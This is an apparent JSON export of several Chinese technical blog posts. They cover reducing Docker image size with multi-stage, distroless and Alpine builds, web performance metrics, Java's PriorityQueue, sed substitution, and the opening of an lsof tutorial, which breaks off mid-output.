https://zh.wikipedia.org/wiki/%E4%BC%81%E4%B8%9A%E6%9C%8D%E5%8A%A1%E6%80%BB%E7%BA%BF ESB和SOA到底是什么？ - https://zato.io/docs/intro/esb-soa-cn.html Microservices - Martin Fowler - https://martinfowler.com/articles/microservices.html 微服务架构 vs. SOA架构 - https://blog.csdn.net/chszs/article/details/78515231","comments":true,"categories":[{"name":"DistributedSystem","slug":"DistributedSystem","permalink":"http://swsmile.info/categories/DistributedSystem/"}],"tags":[{"name":"Distributed System","slug":"Distributed-System","permalink":"http://swsmile.info/tags/Distributed-System/"}]},{"title":"【Docker】减小 Docker 镜像体积","date":"2019-08-04T12:49:08.000Z","path":"2019/08/04/【Docker】减小Docker镜像体积/","text":"在构建 Docker 容器时，应该尽量想办法获得体积更小的镜像，因为传输和部署体积较小的镜像速度更快。 但 RUN 语句总是会创建一个新层，而且在生成镜像之前还需要使用很多中间文件，在这种情况下，该如何获得体积更小的镜像呢？ 1 通过 Docker 多阶段构建将多个层压缩为一个Background大多数 Dockerfiles 都使用了一些奇怪的技巧： 12FROM ubuntuRUN apt-get update &amp;&amp; apt-get install vim 为什么使用 &amp;&amp;？而不是使用两个 RUN 语句代替呢？比如： 复制代码 123FROM ubuntuRUN apt-get updateRUN apt-get install vim 从 Docker 1.10 开始，COPY、ADD 和 RUN 语句会向镜像中添加新层。前面的示例创建了两个层而不是一个。 镜像的层就像 Git 的提交（commit）一样。 Docker 的层用于保存镜像的上一版本和当前版本之间的差异。就像 Git 的提交一样，如果你与其他存储库或镜像共享它们，就会很方便。 实际上，当你向注册表请求镜像时，只是下载你尚未拥有的层。这是一种非常高效地共享镜像的方式。 但额外的层并不是没有代价的。 层仍然会占用空间，你拥有的层越多，最终的镜像就越大。Git 存储库在这方面也是类似的，存储库的大小随着层数的增加而增加，因为 Git 必须保存提交之间的所有变更。 过去，将多个 RUN 语句组合在一行命令中或许是一种很好的做法，就像上面的第一个例子那样，但在现在看来，这样做并不妥。 Solution当 Git 存储库变大时，你可以选择将历史提交记录压缩为单个提交。 事实证明，在 Docker 中也可以使用多阶段构建达到类似的目的。 在这个示例中，你将构建一个 Node.js 容器。 让我们从 index.js 开始： 123456const express = require('express')const app = express()app.get('/', (req, res) =&gt; res.send('Hello World!'))app.listen(3000, () =&gt; &#123; console.log(`Example app listening on port 3000!`)&#125;) 和 package.json： 1234567891011&#123; \"name\": \"hello-world\", \"version\": \"1.0.0\", \"main\": \"index.js\", \"dependencies\": &#123; \"express\": \"^4.16.2\" &#125;, \"scripts\": &#123; \"start\": \"node index.js\" &#125;&#125; 你可以使用下面的 Dockerfile 来打包这个应用程序： 123456FROM node:8EXPOSE 3000WORKDIR /appCOPY package.json index.js ./RUN npm installCMD [\"npm\", \"start\"] 然后开始构建镜像： 1$ docker build -t node-vanilla . 然后用以下方法验证它是否可以正常运行： 1$ docker run -p 3000:3000 -ti --rm --init node-vanilla 你应该能访问 http://localhost:3000 ，并收到“Hello World!”。 Dockerfile 中使用了一个 COPY 语句和一个 RUN 语句，所以按照预期，新镜像应该比基础镜像多出至少两个层： 1234567891011121314151617181920$ docker history node-vanillaIMAGE CREATED BY SIZE075d229d3f48 /bin/sh -c #(nop) CMD [\"npm\" \"start\"] 0Bbc8c3cc813ae /bin/sh -c npm install 2.91MBbac31afb6f42 /bin/sh -c #(nop) COPY multi:3071ddd474429e1… 364B500a9fbef90e /bin/sh -c #(nop) WORKDIR /app 0B78b28027dfbf /bin/sh -c #(nop) EXPOSE 3000 0Bb87c2ad8344d /bin/sh -c #(nop) CMD [\"node\"] 0B&lt;missing&gt; /bin/sh -c set -ex &amp;&amp; for key in 6A010… 4.17MB&lt;missing&gt; /bin/sh -c #(nop) ENV YARN_VERSION=1.3.2 0B&lt;missing&gt; /bin/sh -c ARCH= &amp;&amp; dpkgArch=\"$(dpkg --print… 56.9MB&lt;missing&gt; /bin/sh -c #(nop) ENV NODE_VERSION=8.9.4 0B&lt;missing&gt; /bin/sh -c set -ex &amp;&amp; for key in 94AE3… 129kB&lt;missing&gt; /bin/sh -c groupadd --gid 1000 node &amp;&amp; use… 335kB&lt;missing&gt; /bin/sh -c set -ex; apt-get update; apt-ge… 324MB&lt;missing&gt; /bin/sh -c apt-get update &amp;&amp; apt-get install… 123MB&lt;missing&gt; /bin/sh -c set -ex; if ! command -v gpg &gt; /… 0B&lt;missing&gt; /bin/sh -c apt-get update &amp;&amp; apt-get install… 44.6MB&lt;missing&gt; /bin/sh -c #(nop) CMD [\"bash\"] 0B&lt;missing&gt; /bin/sh -c #(nop) ADD file:1dd78a123212328bd… 123MB 但实际上，生成的镜像多了五个新层：每一个层对应 Dockerfile 里的一个语句。 现在，让我们来试试 Docker 的多阶段构建。 你可以继续使用与上面相同的 Dockerfile，只是现在要调用两次： 12345678FROM node:8 as buildWORKDIR /appCOPY package.json index.js ./RUN npm installFROM node:8COPY --from=build /app /EXPOSE 3000CMD [&quot;index.js&quot;] Dockerfile 的第一部分创建了三个层，然后这些层被合并并复制到第二个阶段。在第二阶段，镜像顶部又添加了额外的两个层，所以总共是三个层。 现在来验证一下。首先，构建容器： 1$ docker build -t node-multi-stage . 查看镜像的历史： 123456789101112131415161718$ docker history node-multi-stageIMAGE CREATED BY SIZE331b81a245b1 /bin/sh -c #(nop) CMD [\"index.js\"] 0Bbdfc932314af /bin/sh -c #(nop) EXPOSE 3000 0Bf8992f6c62a6 /bin/sh -c #(nop) COPY dir:e2b57dff89be62f77… 1.62MBb87c2ad8344d /bin/sh -c #(nop) CMD [\"node\"] 0B&lt;missing&gt; /bin/sh -c set -ex &amp;&amp; for key in 6A010… 4.17MB&lt;missing&gt; /bin/sh -c #(nop) ENV YARN_VERSION=1.3.2 0B&lt;missing&gt; /bin/sh -c ARCH= &amp;&amp; dpkgArch=\"$(dpkg --print… 56.9MB&lt;missing&gt; /bin/sh -c #(nop) ENV NODE_VERSION=8.9.4 0B&lt;missing&gt; /bin/sh -c set -ex &amp;&amp; for key in 94AE3… 129kB&lt;missing&gt; /bin/sh -c groupadd --gid 1000 node &amp;&amp; use… 335kB&lt;missing&gt; /bin/sh -c set -ex; apt-get update; apt-ge… 324MB&lt;missing&gt; /bin/sh -c apt-get update &amp;&amp; apt-get install… 123MB&lt;missing&gt; /bin/sh -c set -ex; if ! command -v gpg &gt; /… 0B&lt;missing&gt; /bin/sh -c apt-get update &amp;&amp; apt-get install… 44.6MB&lt;missing&gt; /bin/sh -c #(nop) CMD [\"bash\"] 0B&lt;missing&gt; /bin/sh -c #(nop) ADD file:1dd78a123212328bd… 123MB 文件大小是否已发生改变？ 123$ docker images | grep node-node-multi-stage 331b81a245b1 678MBnode-vanilla 075d229d3f48 679MB 最后一个镜像（node-multi-stage）更小一些。 你已经将镜像的体积减小了，即使它已经是一个很小的应用程序。 但整个镜像仍然很大！ 有什么办法可以让它变得更小吗？ 2 用 distroless 去除容器中所有不必要的东西这个镜像包含了 Node.js 以及 yarn、npm、bash 和其他的二进制文件。因为它也是基于 Ubuntu 的，所以你等于拥有了一个完整的操作系统，其中包括所有的小型二进制文件和实用程序。 但在运行容器时是不需要这些东西的，你需要的只是 Node.js。 Docker 容器应该只包含一个进程以及用于运行这个进程所需的最少的文件，你不需要整个操作系统。 实际上，你可以删除 Node.js 之外的所有内容。 但要怎么做？ 所幸的是，谷歌为我们提供了 distroless 。 以下是 distroless 存储库的描述： “distroless”镜像只包含应用程序及其运行时依赖项，不包含程序包管理器、shell 以及在标准 Linux 发行版中可以找到的任何其他程序。 这正是你所需要的！ 你可以对 Dockerfile 进行调整，以利用新的基础镜像，如下所示： 12345678FROM node:8 as buildWORKDIR /appCOPY package.json index.js ./RUN npm installFROM gcr.io/distroless/nodejsCOPY --from=build /app /EXPOSE 3000CMD [&quot;index.js&quot;] 你可以像往常一样编译镜像： 1$ docker build -t node-distroless . 这个镜像应该能正常运行。要验证它，可以像这样运行容器： 1$ docker run -p 3000:3000 -ti --rm --init node-distroless 现在可以访问 http://localhost:3000 页面。 不包含其他额外二进制文件的镜像是不是小多了？ 12$ docker images | grep node-distrolessnode-distroless 7b4db3b7f1e5 76.7MB 只有 76.7MB！ 比之前的镜像小了 600MB！ 但在使用 distroless 时有一些事项需要注意。 当容器在运行时，如果你想要检查它，可以使用以下命令 attach 到正在运行的容器上： 1$ docker exec -ti &lt;insert_docker_id&gt; bash attach 到正在运行的容器并运行 bash 命令就像是建立了一个 SSH 会话一样。 但 distroless 版本是原始操作系统的精简版，没有了额外的二进制文件，所以容器里没有 shell！ 在没有 shell 的情况下，如何 attach 到正在运行的容器呢？ 答案是，你做不到。这既是个坏消息，也是个好消息。 之所以说是坏消息，因为你只能在容器中执行二进制文件。你可以运行的唯一的二进制文件是 Node.js： 1$ docker exec -ti &lt;insert_docker_id&gt; node 说它是个好消息，是因为如果攻击者利用你的应用程序获得对容器的访问权限将无法像访问 shell 那样造成太多破坏。换句话说，更少的二进制文件意味着更小的体积和更高的安全性，不过这是以痛苦的调试为代价的。 或许你不应在生产环境中 attach 和调试容器，而应该使用日志和监控。 但如果你确实需要调试，又想保持小体积该怎么办？ 3 小体积的 Alpine 基础镜像你可以使用 Alpine 基础镜像替换 distroless 基础镜像。 Alpine Linux 是： 一个基于 musl libc 和 busybox 的面向安全的轻量级 Linux 发行版。 换句话说，它是一个体积更小也更安全的 Linux 发行版。 不过你不应该理所当然地认为他们声称的就一定是事实，让我们来看看它的镜像是否更小。 先修改 Dockerfile，让它使用 node:8-alpine： 12345678FROM node:8 as buildWORKDIR /appCOPY package.json index.js ./RUN npm installFROM node:8-alpineCOPY --from=build /app /EXPOSE 3000CMD [\"npm\", \"start\"] 使用下面的命令构建镜像： 1$ docker build -t node-alpine . 现在可以检查一下镜像大小： 12$ docker images | grep node-alpinenode-alpine aa1f85f8e724 69.7MB 69.7MB！ 甚至比 distrless 镜像还小！ 现在可以 attach 到正在运行的容器吗？让我们来试试。 让我们先启动容器： 12$ docker run -p 3000:3000 -ti --rm --init node-alpineExample app listening on port 3000! 你可以使用以下命令 attach 到运行中的容器： 12$ docker exec -ti 9d8e97e307d7 bashOCI runtime exec failed: exec failed: container_linux.go:296: starting container process caused \"exec: \\\"bash\\\": executable file not found in $PATH\": unknown 看来不行，但或许可以使用 shell？ 1$ docker exec -ti 9d8e97e307d7 sh / # 成功了！现在可以 attach 到正在运行的容器中了。 看起来很有希望，但还有一个问题。 Alpine 基础镜像是基于 muslc 的——C 语言的一个替代标准库，而大多数 Linux 发行版如 Ubuntu、Debian 和 CentOS 都是基于 glibc 的。这两个库应该实现相同的内核接口。 但它们的目的是不一样的： glibc 更常见，速度也更快； muslc 使用较少的空间，并侧重于安全性。 在编译应用程序时，大部分都是针对特定的 libc 进行编译的。如果你要将它们与另一个 libc 一起使用，则必须重新编译它们。 换句话说，基于 Alpine 基础镜像构建容器可能会导致非预期的行为，因为标准 C 库是不一样的。 你可能会注意到差异，特别是当你处理预编译的二进制文件（如 Node.js C++ 扩展）时。 例如，PhantomJS 的预构建包就不能在 Alpine 上运行。 你应该选择哪个基础镜像？你应该使用 Alpine、distroless 还是原始镜像？ 如果你是在生产环境中运行容器，并且更关心安全性，那么可能 distroless 镜像更合适。 添加到 Docker 镜像的每个二进制文件都会给整个应用程序增加一定的风险。 只在容器中安装一个二进制文件可以降低总体风险。 例如，如果攻击者能够利用运行在 distroless 上的应用程序的漏洞，他们将无法在容器中使用 shell，因为那里根本就没有 shell！ 请注意，OWASP 本身就建议尽量减少攻击表面。 如果你只关心更小的镜像体积，那么可以考虑基于 Alpine 的镜像。 它们的体积非常小，但代价是兼容性较差。Alpine 使用了略微不同的标准 C 库——muslc。你可能会时不时地遇到一些兼容性问题。 原始基础镜像非常适合用于测试和开发。 它虽然体积很大，但提供了与 Ubuntu 工作站一样的体验。此外，你还可以访问操作系统的所有二进制文件。 再回顾一下各个镜像的大小： node:8 681MB node:8 使用多阶段构建为 678MB gcr.io/distroless/nodejs 76.7MB node:8-alpine 69.7MB Reference 三个技巧，将 Docker 镜像体积减小 90% - https://www.infoq.cn/article/3-simple-tricks-for-smaller-docker-images","comments":true,"categories":[{"name":"Docker","slug":"Docker","permalink":"http://swsmile.info/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"http://swsmile.info/tags/Docker/"}]},{"title":"【Performance】 性能指标（Performance Indicator）","date":"2019-08-04T05:45:56.000Z","path":"2019/08/04/【Performance】性能指标/","text":"并发数（Concurrency）并发数（Concurrency），也叫并发连接数，指网络设备所能处理的最大会话数量。这里的会话数是指请求-&gt;响应一次会话。 并发用户数并发用户数是指系统可以同时承载的正常使用系统功能的用户的数量。与吞吐量相比，并发用户数是一个更直观但也更笼统的性能指标。 吞吐率（Throughput）我们一般使用单位时间内服务器处理的请求数来描述其并发处理能力。称之为吞吐率（Throughput），单位是 “req/s”。吞吐率特指Web服务器单位时间内处理的请求数。 另一种描述，吞吐率是，单位时间内网络上传输的数据量，也可以指单位时间内处理客户请求数量。它是衡量网络性能的重要指标。通常情况下，吞吐率“字节数/秒”来衡量。当然你也可以用“请求数/秒”和“页面数/秒”来衡量。其实不管一个请求还是一个页面，它的本质都是在网络上传输的数据，那么用来表述数据的单位就是字节数。 吞吐量（Throughput Capacity）吞吐量（Throughput Capacity），是指在一次性能测试过程中网络上传输的数据量的总和。 对于交互式应用来说，吞吐量指标反映的是服务器承受的压力，在容量规划的测试中，吞吐量是一个重点关注的指标，因为它能够说明系统级别的负载能力，另外，在性能调优过程中，吞吐量指标也有重要的价值。如一个大型工厂，他们的生产效率与生产速度很快，一天生产10W吨的货物，结果工厂的运输能力不行，就两辆小型三轮车一天拉2吨的货物，比喻有些夸张，但我想说明的是这个运输能力是整个系统的瓶颈。 其实，用吞吐量来衡量一个系统的输出能力是极其不准确的，用个最简单的例子说明，一个水龙头开一天一夜，流出10吨水；10个水龙头开1秒钟，流出0.1吨水。当然是一个水龙头的吞吐量大。你能说1个水龙头的出水能力是10个水龙头的强？所以，我们要加单位时间，看谁1秒钟的出水量大。这就是吞吐率。 吞吐量、吞吐率的意义 吞吐量的限制是性能瓶颈的一种重要表现形式，因此，有针对地对吞吐量设计测试，可以协助尽快定位到性能瓶颈所在的位置 80%系统的性能瓶颈都是由吞吐量制约 并发用户和吞吐量瓶颈之间存在一定的关联 通过不断增加并发用户数和吞吐量观察系统的性能瓶颈。然后，从网络、数据库、应用服务器和代码本身4个环节确定系统的性能瓶颈。 每秒查询率（Query Per Second，QPS）每秒查询率（Query Per Second，QPS）是对一个特定的查询服务器在规定时间内所处理流量多少的衡量标准，在因特网上，作为域名系统服务器的机器的性能经常用每秒查询率来衡量。对应fetches/sec，即每秒的响应请求数，也即是最大吞吐能力。 TPS：Transactions Per Second（每秒事务处理数），指服务器每秒处理的事务次数。一般用于评估数据库、交易系统的基准性能。 QPS：Queries Per Second（查询量/秒），是服务器每秒能够处理的查询次数，例如域名服务器、MySQL查询性能。 RPS：Request Per Second（请求数/秒）：RPS（Request Per Second）和QPS可以认为是一回事。 响应时间（Response Time）客户端发一个请求开始计时，到客户端接收到从服务器端返回的响应结果结束所经历的时间，响应时间（Response Time）由请求发送时间、网络传输时间和服务器处理时间三部分组成。也叫Think Time。 吞吐率和压力测试单从定义来看，吞吐率描述了服务器在实际运行期间单位时间内处理的请求数，然而，我们更加关心的是服务器并发处理能力的上限，也就是单位时间内服务器能够处理的最大请求数，即最大吞吐率。 所以我们普遍使用“压力测试”的方法，通过模拟足够多数目的并发用户，分别持续发送一定的HTTP请求，并统计测试持续的总时间，计算出基于这种“压力”下的吞吐率，即为一个平均计算值。 注意 在Web服务器的实际工作中，其处理的HTTP请求通常包括对很多不同资源的请求，也就是请求不同的URL， 比如这些请求有的是获取图片，有的是获取动态内容，显然服务器处理这些请求所花费的时间各不相同，而这些请求的不同时间组成比例又是不确定的。这就是实际情况下的吞吐率。 所以，我们对于同一个特定有代表性的请求进行压力测试，然后对多个请求的吞吐率按照比例计算加权平均值。 Web服务器并发能力强弱的关键便是在于如何计算针对不同的请求性质来设计最优并发策略。在一定程度上使得Web服务器的性能无法充分发挥，这很容易理解，就像银行对不同业务设立不同的窗口一样，这些窗口的服务员分别熟悉自己的窗口业务。可以未不同的客户分别快速办理业务，但是如果让这些窗口都可以办理所有业务，也就是客户可以去任何窗口办理任何业务，那会是怎么样呢？没有几个银行业务员会对所有业务都轻车熟路，这样势必会影响到整体的业务办理速度。 压力测试压力测试的描述一般包括两个部分，即并发用户数和总请求数，也就是模拟多少用户同时向服务器发送多少请求。 请求性质则是对请求的URL所代表的资源的描述，比如1KB大小的静态文件，或者包含10次数据库查询的动态内容等。 并发用户数并发用户数就是指在某一时刻同时向服务器发送请求的用户总数。 假如100个用户同时向服务器分别进行10次请求，与1个用户向服务器连续进行1000次请求。两个的效果一样么？ 一个用户向服务器连续进行1000次请求的过程中，任何时刻服务器的网卡接受缓存区中只有来自该用户的1个请求，而100个用户同时向服务器分别进行10次请求的过程中，服务器网卡接收缓冲区中最多有100个等待处理的请求，显然这时候服务器的压力更大。 一个服务器最多支持多少并发用户数呢？ 我们可以说，这个柜台支持的最大并发数为10，因为恰好在这个并发数下，柜台业务开展的非常成功。顾客们都对服务时间非常满意，而此时代表业务办理次数的柜台吞吐率也比较高，商场和顾客们实现双赢。 可见，通常所讲的最大并发数是有一定利益前提的，那就是服务器和用户双方所期待的最大收益，服务器希望支持高并发数及高吞吐率，而用户不管那么多，只希望等待较少的时间，或者得到更快的下载速度。 所以得出最大并发数的意义，在于了解服务器的承载能力，并且结合用户规模考虑适当的扩展方案。 对于同一域名下URL的并发下载数是有最大限制的，具体限制视浏览器的不同而不同。 一个真实的用户可能会给服务器带来两个或更多的并发用户的压力，一些高明的用户还可以通过一些方法来修改浏览器的并发数限制。 请求等待时间 用户平均请求等待时间 服务器平均请求处理时间 用户平均请求等待时间主要用户衡量服务器在一定并发用户数的情况下，对于单个用户的服务质量服务器平均请求处理时间与前者相比，则用户衡量服务器的整体服务质量，它其实就是吞吐率的倒数。 Reference 吞吐率、吞吐量、TPS、性能测试，纸上不谈兵—-一步一步构建高性能 Web 站点 - https://ruby-china.org/topics/26221","comments":true,"categories":[{"name":"Performance","slug":"Performance","permalink":"http://swsmile.info/categories/Performance/"}],"tags":[{"name":"Performance","slug":"Performance","permalink":"http://swsmile.info/tags/Performance/"}]},{"title":"【Java】集合类 - PriorityQueue类（优先队列）","date":"2019-08-02T14:32:54.000Z","path":"2019/08/02/【Java】集合类-PriorityQueue/","text":"PriorityQueue类PriorityQueue 类在 Java 1.5 中引入。 PriorityQueue 是基于优先堆的一个无界队列，这个优先队列中的元素可以默认自然排序或者通过提供的 Comparator 在队列实例化的时排序。 默认情况下，为最小堆（这意味着，通过 queue.poll() 方法获取的第一个元素为队列中的最小值）。 PriorityQueue 不允许空值，而且不支持 non-comparable（不可比较）的对象，比如用户自定义的类。优先队列要求使用 Java Comparable 和 Comparator 接口给对象排序，并且在排序时会按照优先级处理其中的元素。 PriorityQueue 的大小是不受限制的，但在创建时可以指定初始大小。当我们向优先队列增加元素的时候，队列大小会自动增加。 PriorityQueue 是非线程安全的，所以 Java 提供了 PriorityBlockingQueue（实现 BlockingQueue接口）用于Java 多线程环境。 构造函数可以在构造函数中指定如何排序。如： 123456// 使用默认的初始容量创建一个 PriorityQueue，并根据其自然顺序来排序其元素（使用 Comparable）。PriorityQueue()// 使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序来排序其元素（使用 Comparable）。PriorityQueue(int initialCapacity)// 使用指定的初始容量创建一个 PriorityQueue，并根据指定的比较器comparator来排序其元素。PriorityQueue(int initialCapacity, Comparator&lt;? super E&gt; comparator) 自己实现比较器以进行自定义排序如果希望自己指定比较器进行排序 123456Queue&lt;Integer&gt; pq = new PriorityQueue&lt;Integer&gt;(11, new Comparator&lt;Integer&gt;() &#123; public int compare(Integer i1, Integer i2) &#123; return i2 - i1; &#125; &#125;); 1234567891011121314151617181920212223242526272829public class PriorityQueueTest&#123; public static void main(String args[])&#123; PriorityQueue&lt;People&gt; queue = new PriorityQueue&lt;People&gt;(11, new Comparator&lt;People&gt;() &#123; public int compare(People p1, People p2) &#123; return p2.age - p1.age; &#125; &#125;); for (int i = 1; i &lt;= 10; i++) &#123; queue.add(new People(\"张\"+ i, (new Random().nextInt(100)))); &#125; while (!queue.isEmpty()) &#123; System.out.println(queue.poll().toString()); &#125; &#125; &#125; class People &#123; String name; int age; public People(String name, int age)&#123; this.name = name; this.age = age; &#125; public String toString() &#123; return \"姓名：\"+name + \" 年龄：\" + age; &#125; &#125; Demo123456789101112131415161718192021222324252627282930313233343536373839404142434445public class PriorityQueueTest &#123; public static void main(String[] args) &#123; Queue&lt;Integer&gt; queue1 = new PriorityQueue&lt;Integer&gt;(); queue1.add(2); queue1.add(1); queue1.add(3); while (!queue1.isEmpty()) &#123; Integer i = queue1.poll(); System.out.println(i); &#125; Comparator&lt;Student&gt; comparator = new Comparator&lt;Student&gt;() &#123; @Override public int compare(Student o1, Student o2) &#123; return (o1.id - o2.id); &#125; &#125;; Queue&lt;Student&gt; queue2 = new PriorityQueue&lt;Student&gt;(comparator); queue2.add(new Student(2, \"B\")); queue2.add(new Student(1, \"A\")); queue2.add(new Student(3, \"C\")); while (!queue2.isEmpty()) &#123; Student s = queue2.poll(); System.out.println(s.toString()); &#125; &#125; public static class Student &#123; private int id; private String name; public Student(int id, String name) &#123; this.id = id; this.name = name; &#125; public String toString() &#123; return id + \"-\" + name; &#125; &#125;&#125; 输出： 1234561231-A2-B3-C 实现原理通过堆实现，具体说是通过完全二叉树（complete binary tree）实现的小顶堆（任意一个非叶子节点的权值，都不大于其左右子节点的权值），也就意味着可以通过数组来作为 PriorityQueue 的底层实现。 add(E e) / offer(E e) - 添加元素add(E e) 和 offer(E e) 操作的时间复杂度为 $O(log_2N)$，这两个方法是等同的（equivalent）的，均用于添加一个特定元素到优先队列中： 12345678910111213141516public boolean offer(E e) &#123; if (e == null) throw new NullPointerException(); modCount++; int i = size; if (i &gt;= queue.length) grow(i + 1); size = i + 1; if (i == 0) queue[0] = e; else siftUp(i, e); return true;&#125;public boolean add(E e) &#123;return offer(e);&#125; poll() - 移除队头元素poll() 操作的时间复杂度为 $O(log_2N)$，而 remove(Object o) 方法也用于移除队头元素，但是在调用时，需要传入一个元素，如果这个元素当前处于队头，则移除该元素（并返回 true），否则不进行任何操作（并返回 false）。 12345678910111213141516171819202122public E poll() &#123; if (size == 0) return null; int s = --size; modCount++; E result = (E) queue[0]; E x = (E) queue[s]; queue[s] = null; if (s != 0) siftDown(0, x); return result;&#125;public boolean remove(Object o) &#123; int i = indexOf(o); if (i == -1) return false; else &#123; removeAt(i); return true; &#125;&#125; peek() - 获取队头元素peek() 操作的时间复杂度为 O(1)： 123public E peek() &#123; return (size == 0) ? null : (E) queue[0];&#125; Reference Java学习笔记–PriorityQueue(优先队列)(堆) - https://www.cnblogs.com/gnivor/p/4841191.html Java 优先级队列 PriorityQueue - https://www.jianshu.com/p/c577796e537a","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Linux】命令 - sed命令","date":"2019-08-02T04:08:07.000Z","path":"2019/08/02/【Linux】命令-sed命令/","text":"Usage12usage: sed script [-Ealn] [-i extension] [file ...] sed [-Ealn] [-i extension] [-e script] ... [-f script_file] ... [file ...] 用s命令 - 替换匹配字符串我使用下面的这段文本做演示： 123456789$ cat pets.txtThis is my cat my cat's name is bettyThis is my dog my dog's name is frankThis is my fish my fish's name is georgeThis is my goat my goat's name is adam 把其中的 my 字符串替换成 Hao Chen’s，下面的语句应该很好理解（ s 表示替换命令，/my/ 表示匹配my，/Hao Chen’s/ 表示把匹配字符串替换成 Hao Chen’s，/g 表示把一行中所有的匹配字符串都进行替换）： 123456789$ sed \"s/my/Hao Chen's/g\" pets.txtThis is Hao Chen's cat Hao Chen's cat's name is bettyThis is Hao Chen's dog Hao Chen's dog's name is frankThis is Hao Chen's fish Hao Chen's fish's name is georgeThis is Hao Chen's goat Hao Chen's goat's name is adam 注意：如果你要使用单引号，那么你没办法通过 \\这样来转义，就有双引号就可以了，在双引号内可以用 \\” 来实现对双引号的转义。 再注意：上面的sed并没有对文件的内容改变，只是把处理过后的内容输出，如果你要写回文件，你可以使用重定向，如： 1$ sed \"s/my/Hao Chen's/g\" pets.txt &gt; hao_pets.txt 或使用 -i 参数直接修改文件内容： 1$ sed -i \"s/my/Hao Chen's/g\" pets.txt 在每一行最开头部分增加字符串： 12345678910# 在每一行最开头部分增加字符串“#”$ sed 's/^/#/g' pets.txt#This is my cat# my cat's name is betty#This is my dog# my dog's name is frank#This is my fish# my fish's name is george#This is my goat# my goat's name is adam 在每一行最后面加点东西： 123456789$ sed 's/$/ --- /g' pets.txtThis is my cat --- my cat's name is betty ---This is my dog --- my dog's name is frank ---This is my fish --- my fish's name is george ---This is my goat --- my goat's name is adam --- 顺手介绍一下正则表达式的一些最基本的东西： ^ 表示一行的开头。如：/^#/ 以#开头的匹配。 $ 表示一行的结尾。如：/}$/ 以}结尾的匹配。 \\&lt; 表示词首。 如：\\&lt;abc 表示以 abc 为首的词。 \\&gt; 表示词尾。 如：abc\\&gt; 表示以 abc 結尾的词。 . 表示任何单个字符。 * 表示某个字符出现了0次或多次。 [ ] 字符集合。 如：[abc] 表示匹配a或b或c（一次字符），还有 [a-zA-Z] 表示匹配任何大小或者小写的一个英文字符。如果其中有^表示反，如 [^a] 表示非a的字符 正规则表达式是一些很牛的事，比如我们要去掉某html中的tags： 1&lt;b&gt;This&lt;/b&gt; is what &lt;span style=\"text-decoration: underline;\"&gt;I&lt;/span&gt; meant. Understand? 看看我们的sed命令 1234567# 如果你这样搞的话，就会有问题$ sed 's/&lt;.*&gt;//g' html.txt Understand? # 要解决上面的那个问题，就得像下面这样。$ sed 's/&lt;[^&gt;]*&gt;//g' html.txtThis is what I meant. Understand? 指定指匹配第x行只替换第3行的内容 123456789$ sed \"3s/my/your/g\" pets.txtThis is my cat my cat's name is bettyThis is your dog my dog's name is frankThis is my fish my fish's name is georgeThis is my goat my goat's name is adam 只替换第3到第6行的文本。 123456789$ sed \"3,6s/my/your/g\" pets.txtThis is my cat my cat's name is bettyThis is your dog your dog's name is frankThis is your fish your fish's name is georgeThis is my goat my goat's name is adam 12345$ cat my.txtThis is my cat, my cat's name is bettyThis is my dog, my dog's name is frankThis is my fish, my fish's name is georgeThis is my goat, my goat's name is adam 只替换每一行的第一个s： 12345$ sed 's/s/S/1' my.txtThiS is my cat, my cat's name is bettyThiS is my dog, my dog's name is frankThiS is my fish, my fish's name is georgeThiS is my goat, my goat's name is adam 只替换每一行的第二个s： 12345$ sed 's/s/S/2' my.txtThis iS my cat, my cat's name is bettyThis iS my dog, my dog's name is frankThis iS my fish, my fish's name is georgeThis iS my goat, my goat's name is adam 只替换每一行的第3个以后的s： 12345$ sed 's/s/S/3g' my.txtThis is my cat, my cat'S name iS bettyThis is my dog, my dog'S name iS frankThis is my fiSh, my fiSh'S name iS georgeThis is my goat, my goat'S name iS adam Reference SED 简明教程 - https://coolshell.cn/articles/9104.html","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Linux】命令 - lsof 命令","date":"2019-08-01T10:25:06.000Z","path":"2019/08/01/【Linux】命令-lsof命令/","text":"lsof命令是什么lsof（list open files）是一个查看当前系统文件的工具。在linux环境下，任何事物都以文件的形式存在，通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件。如传输控制协议 (TCP) 和用户数据报协议 (UDP) 套接字等，系统在后台都为该应用程序分配了一个文件描述符，该文件描述符提供了大量关于这个应用程序本身的信息。 。被打开的文件可以是 普通的文件 目录 网络文件系统的文件 字符设备文件 (函数)共享库 管道，命名管道 符号链接 底层的socket字流，网络socket，unix域名socket 怎样使用lsof -a 列出打开文件存在的进程 -c&lt;进程名&gt; 列出指定进程所打开的文件 -g 列出GID号进程详情 -d&lt;文件号&gt; 列出占用该文件号的进程 +d&lt;目录&gt; 列出目录下被打开的文件 +D&lt;目录&gt; 递归列出目录下被打开的文件 -n&lt;目录&gt; 列出使用NFS的文件 -i&lt;条件&gt; 列出符合条件的进程。（4、6、协议、:端口、 @ip ） -p&lt;进程号&gt; 列出指定进程号所打开的文件 -u 列出UID号进程详情 -h 显示帮助信息 -v 显示版本信息 列出所有打开的文件 1$ lsof 备注: 如果不加任何参数，就会打开所有被打开的文件，建议加上特定参数来查看特定信息。 Usage实例 1 - 查找某个文件相关的进程1$ lsof /filepath/file 实例 2 - 列出某个用户打开的文件信息1$ lsof -u username 备注: -u 选项，u其实是user的缩写 实例 3 - 列出某个程序进程所打开的文件信息12345678910111213141516171819$ lsof -c mysqlCOMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEmysqld_sa 11709 mysql cwd DIR 8,0 4096 2 /mysqld_sa 11709 mysql rtd DIR 8,0 4096 2 /mysqld_sa 11709 mysql txt REG 8,0 964608 484 /usr/bin/bashmysqld_sa 11709 mysql mem REG 8,0 106075056 22286 /usr/lib/locale/locale-archivemysqld_sa 11709 mysql mem REG 8,0 2151672 11137 /usr/lib64/libc-2.17.somysqld_sa 11709 mysql mem REG 8,0 19288 22294 /usr/lib64/libdl-2.17.somysqld_sa 11709 mysql mem REG 8,0 174576 11463 /usr/lib64/libtinfo.so.5.9mysqld_sa 11709 mysql mem REG 8,0 163400 568 /usr/lib64/ld-2.17.somysqld_sa 11709 mysql mem REG 